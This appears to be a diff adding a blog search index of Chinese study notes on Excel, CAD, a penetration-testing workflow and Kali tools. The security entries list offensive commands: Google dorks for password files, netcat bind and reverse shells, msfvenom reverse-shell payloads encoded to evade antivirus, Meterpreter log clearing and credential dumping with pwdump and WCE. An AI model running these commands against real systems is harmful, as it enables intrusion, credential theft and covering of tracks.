@@ -1,0 +1,432 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>数据分析（二）Excel</title>
+      <link href="/2022/04/25/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89Excel/"/>
+      <url>/2022/04/25/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89Excel/</url>
+      
+        <content type="html"><![CDATA[<h2 id="数据分析（二）Excel"><a href="#数据分析（二）Excel" class="headerlink" title="数据分析（二）Excel"></a>数据分析（二）Excel</h2><h3 id="数据录入"><a href="#数据录入" class="headerlink" title="数据录入"></a>数据录入</h3><ol><li>手动输入<br>Tab横向移动单元格，Enter纵向移动单元格<br>Enter+Tab移动到下一行第一列，Shift+Tab&#x2F;Enter回到上一单元格    </li><li>网络获取<br>只能爬取简单结构化数据：本身为表格形式<br>数据→自网站→输入网址→选中区域→加载（全部刷新&#x2F;连接属性下可选实时刷新）</li></ol><h3 id="单元格格式"><a href="#单元格格式" class="headerlink" title="单元格格式"></a>单元格格式</h3><h4 id="原有格式操作"><a href="#原有格式操作" class="headerlink" title="原有格式操作"></a>原有格式操作</h4><ol><li>清除格式：开始→编辑→清除→清除格式  </li><li>跨列居中：代替合并居中，保持原单元格，尽量避免合并居中 </li><li>自动换行：完整显示内容  </li><li>调整列宽：开始→格式→自动调整列宽</li><li>复制粘贴后显示内容不一样→调整格式，输入分数：0+Space+1&#x2F;2</li><li>单元格实际内容为上方编辑栏内容，可自定义格式，加单位格式后仍可计算  </li><li>清除格式：选中单元格→开始→编辑→清除→清除格式</li></ol><h4 id="自定义格式"><a href="#自定义格式" class="headerlink" title="自定义格式"></a>自定义格式</h4><ol><li>数字格式  <ul><li>示例：0.00显示小数点后两位 </li><li>示例：[红色][&gt;&#x3D;20]0;[蓝色][&lt;20]0;0<br>[红色]为颜色代码，&lt;&#x3D;&gt;为条件运算符（可做数据筛选）  </li><li>示例：”正”0;”负”0;”零”0;@ 或者 ↑0;下0;空;@<br>数字格式4个区域，0;0;0;@ 依次为 正数;负数;零;文本</li></ul></li><li>文本格式    <ul><li>示例：@”元”，单元格文本内容后附加显示元<br>@为文本占位符</li></ul></li><li>时间格式  <ul><li>示例：m  只显示月<br>y-m-d 改变ymd顺序和数量改变时间显示方式</li></ul></li></ol><h3 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h3><ol><li>规范数据输入内容<ul><li>示例：选中单元格→数据→数据工具→数据验证→验证条件→序列（序列内容）<br>可实现填写数据时出现下拉列表</li></ul></li><li>数据验证后可圈选不合格数据</li></ol><h3 id="条件格式"><a href="#条件格式" class="headerlink" title="条件格式"></a>条件格式</h3><ol><li>开始→样式→条件格式<br>突出显示符合条件的单元格</li></ol><h3 id="查找-x2F-定位"><a href="#查找-x2F-定位" class="headerlink" title="查找&#x2F;定位"></a>查找&#x2F;定位</h3><ol><li>开始→查找和选择→转到&#x2F;定位条件  <ul><li>查找只能确定具体单元格，定位可寻找符合条件的所有单元格再进行操作  </li><li>可以先选中区域再进行查找（Ctrl+F），不影响其他区域  </li><li>打开查找选项，有更详细的查找功能，可查到全部并替换全部  </li><li>查找&#x2F;替换可结合通配符使用</li></ul></li></ol><h3 id="排序-x2F-筛选"><a href="#排序-x2F-筛选" class="headerlink" title="排序&#x2F;筛选"></a>排序&#x2F;筛选</h3><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ol><li>数字排序：点选需要排序列的任一单元格，点击排序可实现快速排序</li><li>文本排序：默认首字母排序，可选笔划和自定义排序</li></ol><h4 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h4><ol><li>文本筛选：可连续筛选，第二次筛选将“添加到筛选器”框选  </li><li>数字筛选：可点击筛选，也可以使用RANK()函数</li></ol><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><h4 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h4><p>位置：数据→数据工具→分列</p><ol><li>选中区域分列，单元格内容为中文时可先转文本再分列，功能在分列向导下</li><li>利用函数拆分<ul><li>示例：将数据”1234人”文本和数字拆分，只要数字，数据单元格为E2<br>&#x3D;LEFT(E2,LEN(E2)*2-LENB(E2))<br>函数中嵌套LEN()和LENB()函数，LEN统计为5，LENB为6（文本占两个字符）</li></ul></li></ol><h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><ol><li>打印选中区域<br>文件→打印→设置→打印选中区域</li><li>打印完整页面<br>文件→打印→设置→缩放或者调整页边距实现打印完整页面</li><li>居中打印<br>文件→打印→设置→页面设置→页边距→居中方式→水平+垂直</li><li>分页打印标题<br>页面布局→页面设置→启动器（右下三角）→工作表→拉选顶端标题行</li></ol><h3 id="公式-x2F-函数"><a href="#公式-x2F-函数" class="headerlink" title="公式&#x2F;函数"></a>公式&#x2F;函数</h3><p>位置：开始→公式（所有公式和函数）  </p><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><ol><li>求和<ul><li>示例：&#x3D;A1+K1 第一行求和<br>快捷键：拉选区域→Alt+&#x3D;→快速求和</li></ul></li><li>求积<ul><li>示例：&#x3D;A1*2</li></ul></li><li>合并单元格<ul><li>示例：&#x3D;A2 &amp; B$1 &amp; B2<br>合并多个单元格的内容，B$1为B列的列名</li></ul></li></ol><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><ol><li>输入函数名→Ctrl+A 调出详细函数参数</li><li>点击单元格→编辑栏显示行列→A1&#x2F;B2→行列前加$可固定行&#x2F;列 相对引用&#x2F;绝对引用<ul><li>示例：&#x3D;$A1*B$2 固定第A列，第2行 练习方法：九九乘法表</li></ul></li></ol><h5 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h5><ol><li>COUNT:计算区域中包含数字的单元格的个数<br>COUNTA:计算区域中包含非空单元格的个数<br>COUNTBLANK:计算区域中空单元格的数目<br>COUNTIFS:多条件判断<br>COUNTIF:计算区域中符合条件单元格的数目    <ul><li>示例：&#x3D;COUNTIF(A1:A15,”张*”) 统计区域中姓张人数<br> 统计文本内容时，用到通配符*,?,~,三个分别为任意多个字符，任意一个字符，转义字符</li></ul></li></ol><h5 id="求和函数"><a href="#求和函数" class="headerlink" title="求和函数"></a>求和函数</h5><ol><li>SUM:求和<br>SUMIF:附加条件的求和,(Range,Criteria,Sum_range)参数分别为判断区域，判断条件，求和范围<br>SUMPRODUCT:数组相乘求和  <ul><li>示例：&#x3D;SUMPRODUCT(A2:A10,SUMIF(B2:B20),判断条件&#x2F;列，C2:C20)<br>函数嵌套后结果行数与主函数函数相等，数组分别相乘求和</li></ul></li><li>AVERAGE:求平均数<br>AVERAGEIF:附加条件的求平均值  </li><li>SUBTOTAL:11个可选求值参数，原数据筛选后返回值实时更新</li></ol><h4 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h4><ol><li>IF：判断函数<ul><li>示例：IF:(A1&gt;0,”大于0”,”小于0”) 可嵌套使用</li></ul></li><li>MATCH:定位单元格  </li><li>INDEX:返回指定单元格值</li></ol><h3 id="图表可视化"><a href="#图表可视化" class="headerlink" title="图表可视化"></a>图表可视化</h3><h4 id="插入图表"><a href="#插入图表" class="headerlink" title="插入图表"></a>插入图表</h4><ol><li>点选表中任一单元格→插入数据透视表→将字段拖入视图（右下角）→在透视表插入所需图表</li><li>插入切片器→选择字段：进一步筛选并更新图表，切片器全局有效</li></ol><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><h4 id="选中单元格快捷键"><a href="#选中单元格快捷键" class="headerlink" title="选中单元格快捷键"></a>选中单元格快捷键</h4><ol><li>选中第一个单元格，Shift+第二个单元格，快速选中对角区域<br>shift选中首尾可实现连选   </li><li>Ctrl+方向键，快速跳转到最*端</li><li>Ctrl+Shift+方向键，选中整行&#x2F;列</li></ol><h4 id="实用快捷键"><a href="#实用快捷键" class="headerlink" title="实用快捷键"></a>实用快捷键</h4><ol><li>填写第一行后，Ctrl+E快速填充,可实现功能：提取，合并，拆分，重组</li><li>Ctrl+&#x3D;快速求和</li><li>Ctrl+q快速分析，具体可参考弹出内容</li><li>Ctrl+1设置单元格格式  </li><li>Ctrl+Enter原位填充，所有选中的单元格执行一样的操作</li><li>ctrl+~:显示表中的公式，再按一次恢复（可定位）  </li><li>输入数字，鼠标成十字下拉填充，可选序列填充（Ctrl+十字下拉）<br>十字下拉也可以继承公式  </li><li>拉选区域→Alt+&#x3D;→快速求和   </li><li>Ctrl+p打印</li><li>F4锁定行列，公式和函数中使用，可按三次 $<br>下拉填充函数出错时，考虑相对引用&#x2F;绝对引用</li><li>Ctrl+Shift+L 筛选</li></ol><h4 id="默认格式"><a href="#默认格式" class="headerlink" title="默认格式"></a>默认格式</h4><ol><li>文本默认左对齐，数字默认右对齐，状态值默认居中(true&#x2F;false)  </li><li>日期格式：2022-01-01或者2022&#x2F;01&#x2F;01（但别用日期格式存储日期）</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 办公软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Excel，可视化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透测试流程</title>
+      <link href="/2022/04/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
+      <url>/2022/04/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h4 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h4><pre class="line-numbers language-none"><code class="language-none">DNS记录：    A       主机记录     C name  别名记录     NS      域名解析记录    MX      邮件交换记录    ptr     反向域名解析记录nslookup            域名-&gt;ip  dig                 域名-&gt;ip ip-&gt;域名    dig example.com ns                      查询ns记录    dig @ns1.example.com example.com axfr   区域传输，查询所有主机    host -T -l example.com nsq.example.com  l区域传输，同axfr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">DNS注册信息：whois ip&#x2F;域名搜索引擎:SHODAN      搜索引擎，搜索网络设备    net:&quot;1.1.1.0&#x2F;24&quot;    hostname:&quot;xxx&quot;    port:&quot;xx&quot;    country:&quot;CN&quot;    city:&quot;hubei&quot;    geo:&quot;31.8685 117.2808&quot;GOOGLE      搜索引擎    “serch content”                     搜索关键词    inurl:qq.txt                        高级搜索    inurl:&quot;level&#x2F;15&#x2F;exec&#x2F;-&#x2F;show&quot;        思科交换机高级权限    inurl:&#x2F;admin&#x2F;login.php              管理界面搜索    intitle:&quot;netbotz appliance&quot;&quot;ok&quot;     网络设备    filetype:xls&quot;usename | password&quot;    密码文件爬取    inurl:ftp&quot;password&quot;filetype:xls site:baidu.com    inurl:Service.pwd                   漏洞搜索，帐号密码    http:&#x2F;&#x2F;exploit-db.com&#x2F;google-dorks  谷歌搜索范例HD    查找网站后台：    site:xxx.com inurl:login    site:xxx.com intext:管理    site:xxx.com intitle:后台    查看服务器使用程序：    site:xxx.com filetype:asp    site:xxx.com filetype:php    site:xxx.com filetype:jsp    site:xxx.com filetype:aspx    查看上传漏洞：    site:xxx.com inurl:file    site:xxx.com inurl:load  theharvester -d example.com -l 300 -b google                 搜索域内邮件，主机metagoofil -d example.com -t pdf -l 200 -o test -f 1.html    搜索域内文件metago              信息全面检索工具，GTK,需注册登录后使用metadate&#x2F;exiftool   图片信息获取，地理位置，修改时间，拍摄设备等信息RECON-NG            Web信息检索框架，基于搜索引擎,生成报告<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><pre class="line-numbers language-none"><code class="language-none">arping [ip] -c 1 -d     探测主机是否存活，d 发现重复ip主机scapy                   可作为python库调用，也可当工具使用，流量分析 nmap                    扫描工具1.服务器类型：    nmap    &#x2F;usr&#x2F;share&#x2F;exploitdb                kali内置漏洞目录    snmp扫描:        snmpwalk [ip] -c public -v 2c   v：snmp版本 c:指定community        snmpcheck -t [ip] &#123;-w&#125;          w:检测是否可写 （可读性高）     SMB扫描：        nmap [ip] -p139,445 --script&#x3D;smb-os-discovery.nse        nbtscan -r [ip]    SMTP扫描：        nmap2.网站容器（Apache&#x2F;Nginx&#x2F;Tomcat&#x2F;IIS）：     whatweb www.xxx.com3.数据库类型：    Access          后缀名：.mdb 一般asp网页文件用此数据库    SQL Server      端口号：1433 后缀名:.mdf    MySQL           端口号：3306 大部分为php页面    Oracle          端口号：1521 大型网站使用    常见搭配：    ASP,ASPX+ACCESS,SQL Server    PHP+MySQL,PostgreSQL    JSP+Oracle,MySQL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、漏洞扫描"><a href="#二、漏洞扫描" class="headerlink" title="二、漏洞扫描"></a>二、漏洞扫描</h3><h4 id="系统漏洞扫描："><a href="#系统漏洞扫描：" class="headerlink" title="系统漏洞扫描："></a>系统漏洞扫描：</h4><pre class="line-numbers language-none"><code class="language-none">1.openvas    安装：    openvas-setup           初始化安装    openvas-check-setup     检查安装结果    openvasmd --list-users  查看当前帐号    openvasmd --user&#x3D;admin --new-password&#x3D;Passw0rd 修改帐号密码    openvas-feed-update     更新    https:&#x2F;&#x2F;127.0.0.1:9392  浏览器访问使用2.Nessus3.Nexpose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="网站漏洞扫描："><a href="#网站漏洞扫描：" class="headerlink" title="网站漏洞扫描："></a>网站漏洞扫描：</h4><pre class="line-numbers language-none"><code class="language-none">1.AWVS2.AppScan3.Owasp-Zap4.Nessus<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h3><h3 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h3><p>抓包分析工具 OmniPeek(windows),wireshark,Sniffpass(密码抓取windows)<br>浏览器密码保存可查询，<a href="http://nirsoft.net/">http://nirsoft.net</a> 密码还原  </p><pre class="line-numbers language-none"><code class="language-none">PwDump.exe                  在kali&#x2F;usr&#x2F;share&#x2F;windows-b&#x2F;fgdump目录下    pwdump localhost        windows下执行，可获取密码文件，可破解WCE                         在kali&#x2F;usr&#x2F;share&#x2F;wce目录下    wce-universal.exe -lv   列出已登录用户，windows下执行    wce-universal.exe -w    读取用户密码（明文）kali下类似工具：fgdumg,mimikatz等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Shodan,Openvas,Nessus </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali工具使用</title>
+      <link href="/2022/04/10/kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+      <url>/2022/04/10/kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Kali工具使用"><a href="#Kali工具使用" class="headerlink" title="Kali工具使用"></a>Kali工具使用</h2><h3 id="NETCAT-NC"><a href="#NETCAT-NC" class="headerlink" title="NETCAT -NC"></a>NETCAT -NC</h3><pre class="line-numbers language-none"><code class="language-none">nc -nv [ip_add] [port]      连接服务器，n：跟ip地址，不进行dns解析 v：详细内容   传输文本信息：  + nc -l -p [port]             服务器端 l:侦听+ nc -nv [ip_add] [port]      客户端进行连接  传输文件&#x2F;目录：      nc -lp [port] &gt; file.mp4            接收端    nc -nv [ip] [port] &lt; file.mp4 -q 1  发送端    nc -q 1 -lp [port] &lt; file.mp4       发送端    nc -nv [ip] [port] &gt; file.mp4       接收端tar -cvf - dir&#x2F; | nc -lp [port] -q 1    打包发送nc [ip] [port] | tar -xvf -             接收解包端口扫描：nc -nvz -w 1 [ip] [port_range]          w:超时设定 z:扫描功能，默认tcp u:udp mode  远程控制：nc -lp [port] -c bash                   服务器端，被控制端 windows电脑bash换为cmdnc [ip] [port]                          客户端，控制端nc -lp [port]                           反向控制（获取shell）nc -nv [ip] [port] -c bash              被控制端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><pre class="line-numbers language-none"><code class="language-none">tcpdump -i wlan0 -s 0 -w file.cap       s:size为0时抓取完整包tcpdump [-A] [-X] -r file.cap           读取包文件,A详细信息，X十六进制显示tcpdump -i wlan0 tcp port 22            filter显示过滤：tcpdump -n -r file.cap | awk &#39;&#123;print $3&#125;&#39; | sort -u    n:不进行dns解析，awk文本处理工具，显示第3行，u去除重复项tcpdump -n src&#x2F;dst host [ip] -r file.cap               显示指定源地址的包tcpdump -n tcp port [] -r file.cap                     显示指定端口的包tcpdump -A -n &#39;tcp[13]&#x3D;24&#39; -r file.cap                 显示过滤第14个字节为24的包，细化到字节过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class="line-numbers language-none"><code class="language-none">nmap      -sn [ipadd]         ping扫描      -iL [addfile] -sn   调用地址列表文件扫描       -sU [ipadd]         UDP端口扫描，原理：icmp目标不可达      -O  [ipadd]         操作系统      -sV                 服务识别      -sS                 半连接扫描，隐蔽      -sT                 全连接扫描，建立tcp连接  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h4 id="Modules-概况"><a href="#Modules-概况" class="headerlink" title="Modules(概况)"></a>Modules(概况)</h4><pre class="line-numbers language-none"><code class="language-none">Exploits:                   漏洞利用攻击方法，流程      Active exploit          主动攻击，针对服务器，服务存在已知漏洞    Passive exploit         被动攻击，针对客户机，诱使访问制定网站Payload:                    目标机器执行的代码或指令    single:all-in-one    stager                  内存有限时输入的较小的payload用于连接    stages                  利用stager建立连接下载的后续payloadAuxiliary                   辅助模块，没有payload的exploit模块Encoders                    对payload进行加密，躲避病毒软件的查杀Nops                        提高payload稳定性和维持大小  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="MSF基本使用方法"><a href="#MSF基本使用方法" class="headerlink" title="MSF基本使用方法"></a>MSF基本使用方法</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html">show [modules]              显示所有可用模块search [keywords]    name:mysql    path:windows    type:exploit,payload    platform:windowsuse exploit/windows/smb/ms08_067_ntapiinfo                    详细信息    show options               show payloads    show targets    show advanced    show missing            显示未配置选项set options     setg,unsetg             设置全局变量    RHOST 1.1.1.1    RPORT 445    target [2]              设置目标操作系统，可先是show targets查看，提高结果可靠性set payload /pay/...        指定payload，可先是show payload查看    LHOST                   设定攻击机ip    LPORT        use payload/windows/shell_bind_tcp    generate -o /root/1.exe -k -x /usr/share/windows/radmin.exe -f exe  生成程序置于win下执行，获取shellcheck                       检测是否可利用，部分exploit没有此功能run,exploitsave                        保存配置back                        返回上一级   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h4><pre class="line-numbers language-none"><code class="language-none">db_statusdb_rebuild_cache            模块信息映射到数据库，提高相关查询时速度db_disconnect -hdb_connectdb_nmap                     执行nmap命令，保存到数据库    hosts 1.1.1.1    hosts -u                列出状态为up的主机    hosts -S                searchservice -h                  列出所有服务，扫描结果的详细信息vulns,creds,loot(hashdump)db_import,exportsession -l                  run -j后台运行后可查看resource file.rc            原先写好执行脚本，执行命令 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="载荷Meterpreter"><a href="#载荷Meterpreter" class="headerlink" title="载荷Meterpreter"></a>载荷Meterpreter</h4><pre class="line-numbers language-none"><code class="language-none">高级payload     u盘实现？？？  + set payload &#x2F;meterpreter&#x2F;.. 获取shell，通过Meterpreter+ getuid+ getsystem                   获取system权限+ getpid                      查看注入到哪个程序里+ migrate [pid]               迁移注入进程+ ls,cd,pwd,cat,ps            linux命令可执行+ run&#x2F;bgrun []                可通过-h产看可选项，exp：vnc+ clearev                     清除目标机日志+ download&#x2F;upload             下载&#x2F;上传目标机文件+ execute -f cmd.exe -i -H    i:隐秘执行+ load python                 加载python扩展<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="MSF–信息收集"><a href="#MSF–信息收集" class="headerlink" title="MSF–信息收集"></a>MSF–信息收集</h4><pre class="line-numbers language-none"><code class="language-none">主机发现：      use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep      set interface,threads...  端口扫描：      use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;[syn]      set interface,threads...  SNMP扫描：161      use auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_login      snmp_enum      snmp_enumusers (windows)      snmp_enumshares(windows)  SMB扫描：netbios 139,445      use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version      use auxiliary&#x2F;scanner&#x2F;smb&#x2F;pipe_auditor      use auxiliary&#x2F;scanner&#x2F;smb&#x2F;pipe_dcerpc_auditor      use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_enumshares      use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_enumusers      use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_lookupsid  SSH扫描：23      use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version      use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login      set userpass_file &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;  data&#x2F;wordlists&#x2F;root_userpass.txt      set verbose false      use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey  利用已知密钥连接      set KEY_FILE id_rsa      set USERNAME root  sqlserver扫描：  FTP扫描： <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="MSF–漏洞利用"><a href="#MSF–漏洞利用" class="headerlink" title="MSF–漏洞利用"></a>MSF–漏洞利用</h4><h4 id="MSF–客户端攻击"><a href="#MSF–客户端攻击" class="headerlink" title="MSF–客户端攻击"></a>MSF–客户端攻击</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom --payload-options -p windows&#x2F;shell&#x2F;reverse_tcp     LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -f exe -o 1.exemsfconsole      use exploit&#x2F;multi&#x2F;handler      set payload windows&#x2F;shell&#x2F;reverse_tcp      set LHOST 1.1.1.1      set LPORT 4444exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> NC,MSF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CAD基础</title>
+      <link href="/2022/03/05/CAD%E5%9F%BA%E7%A1%80/"/>
+      <url>/2022/03/05/CAD%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<h2 id="CAD基础"><a href="#CAD基础" class="headerlink" title="CAD基础"></a>CAD基础</h2><h3 id="平面图绘制"><a href="#平面图绘制" class="headerlink" title="平面图绘制"></a>平面图绘制</h3><h4 id="绘图工具"><a href="#绘图工具" class="headerlink" title="绘图工具"></a>绘图工具</h4><table><thead><tr><th align="center">操作</th><th align="center">命令</th><th align="center">操作</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">平移</td><td align="center">PAN</td><td align="center">椭圆</td><td align="center">EL</td></tr><tr><td align="center">撤销</td><td align="center">U</td><td align="center">矩形</td><td align="center">REC</td></tr><tr><td align="center">重复命令</td><td align="center">Space</td><td align="center">多边形</td><td align="center">POL</td></tr><tr><td align="center">重做</td><td align="center">REDO</td><td align="center">多线</td><td align="center">ML</td></tr><tr><td align="center">线段</td><td align="center">L</td><td align="center">构造线</td><td align="center">XL</td></tr><tr><td align="center">多线段</td><td align="center">PL</td><td align="center">图案填充</td><td align="center">H</td></tr><tr><td align="center">圆</td><td align="center">C</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">圆弧</td><td align="center">ARC</td><td align="center"></td><td align="center"></td></tr></tbody></table><h4 id="编辑工具"><a href="#编辑工具" class="headerlink" title="编辑工具"></a>编辑工具</h4><table><thead><tr><th align="center">操作</th><th align="center">命令</th><th align="center">注释</th><th align="center">操作</th><th align="center">命令</th><th align="center">注释</th></tr></thead><tbody><tr><td align="center">移动</td><td align="center">M</td><td align="center"></td><td align="center">镜像</td><td align="center">MI</td><td align="center"></td></tr><tr><td align="center">旋转</td><td align="center">RO</td><td align="center"></td><td align="center">倒圆角</td><td align="center">F</td><td align="center">先确定半径 直角转圆角 半径为0时为直角</td></tr><tr><td align="center">修剪</td><td align="center">TR</td><td align="center">两次空格点选</td><td align="center">分解</td><td align="center">X</td><td align="center"></td></tr><tr><td align="center">延伸</td><td align="center">EX</td><td align="center">两次空格点击线</td><td align="center">拉伸</td><td align="center">S</td><td align="center">从右到左拉选对象</td></tr><tr><td align="center">删除</td><td align="center">E</td><td align="center">先选对象</td><td align="center">缩放</td><td align="center">SC</td><td align="center">改变尺寸，比例因子可以为分式新值在前，旧值在后</td></tr><tr><td align="center">复制</td><td align="center">CO</td><td align="center">先选对象</td><td align="center">特性匹配</td><td align="center">MA</td><td align="center">修改对象颜色、线宽、线型</td></tr></tbody></table><h4 id="注释和标注工具"><a href="#注释和标注工具" class="headerlink" title="注释和标注工具"></a>注释和标注工具</h4><table><thead><tr><th align="center">操作</th><th align="center">命令</th><th align="center">注释</th></tr></thead><tbody><tr><td align="center">标注样式管理</td><td align="center">D</td><td align="center"></td></tr><tr><td align="center">线性标注</td><td align="center">DLI</td><td align="center">角度指文字角度</td></tr><tr><td align="center">对齐标注</td><td align="center">DAL</td><td align="center">两点之间的直线距离</td></tr><tr><td align="center">角度标注</td><td align="center">DAN</td><td align="center">圆弧、圆、直线</td></tr><tr><td align="center">半径标注</td><td align="center">DRA</td><td align="center"></td></tr><tr><td align="center">直径标注</td><td align="center">DDI</td><td align="center">直径符号文字输入：%%C</td></tr><tr><td align="center">引线标注</td><td align="center">LE</td><td align="center">角度符号文字输入：%%D</td></tr><tr><td align="center">文字注释(单行)</td><td align="center">DT</td><td align="center">中文：修改字体后可以显示中文</td></tr></tbody></table><h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><p>空格：确认<br>拉选：从右到左拉选全部，从左到右拉选部分<br>绝对坐标：键盘输入x , y –&gt;(x,y)<br>相对坐标：指定某一点(1,1)后输入x , y –&gt;(1+x,1+y)<br>动态输入：输入 长度值+Tab+角度 确认<br>多线（平行线）整理方法：调出菜单栏–&gt;修改–&gt;对象–&gt;多线<br>F3：对象捕捉，除了最近点其它默认开启<br>F8：正交模式，只有垂直方向，可以用角度确定斜线<br>F10：极轴追踪，多角度方向捕捉</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 办公软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cad </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>KODI访问网络位置</title>
